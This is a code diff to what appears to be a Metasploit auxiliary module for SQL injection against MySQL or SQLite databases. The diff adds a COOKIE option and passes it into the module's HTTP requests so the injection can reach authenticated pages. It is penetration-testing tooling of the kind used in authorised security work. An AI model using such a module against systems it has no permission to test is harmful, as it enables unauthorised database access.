@@ -33,6 +33,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new("INJECTION", [ true, "The output we are looking for", "version()" ]),
         OptString.new("OTHER_POST_DATA", [ false, "Other POST data, if needed", "" ]),
         OptString.new("DATABASE", [ true, "Targeted database (MySQL|Sqlite)", "MySQL" ]),
+        OptString.new("COOKIE", [ false, "Cookie needed to access the SQLi", "" ]),
       ])
   end
 
@@ -42,6 +43,7 @@ class MetasploitModule < Msf::Auxiliary
     param = data['param']
     inj = data['inj_to_send']
     post_data = data['post_data']
+    cookie = data['cookie']
       
     begin
       if ( method.downcase == "get" && post_data == "" )
@@ -55,6 +57,7 @@ class MetasploitModule < Msf::Auxiliary
           'method' => 'GET',
           'uri' => req_uri,
           'version' => '1.0',
+          'cookie' => cookie,
           'vhost' => vhost
         })
         return res
@@ -79,6 +82,7 @@ class MetasploitModule < Msf::Auxiliary
           'uri' => req_uri,
           'vars_post' => req_post_data,
           'version' => '1.0',
+          'cookie' => cookie,
           'vhost' => vhost
         })
         return res
@@ -96,6 +100,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => uri,
         'vars_post' => req_post_data,
         'version' => '1.0',
+        'cookie' => cookie,
         'vhost' => vhost
       })
       return res
@@ -121,6 +126,7 @@ class MetasploitModule < Msf::Auxiliary
     data['inj_to_send'] = ""
     data['injection'] = datastore['INJECTION']
     data['database'] = datastore['DATABASE'].downcase
+    data['cookie'] = datastore['COOKIE']
     return data
   end
   
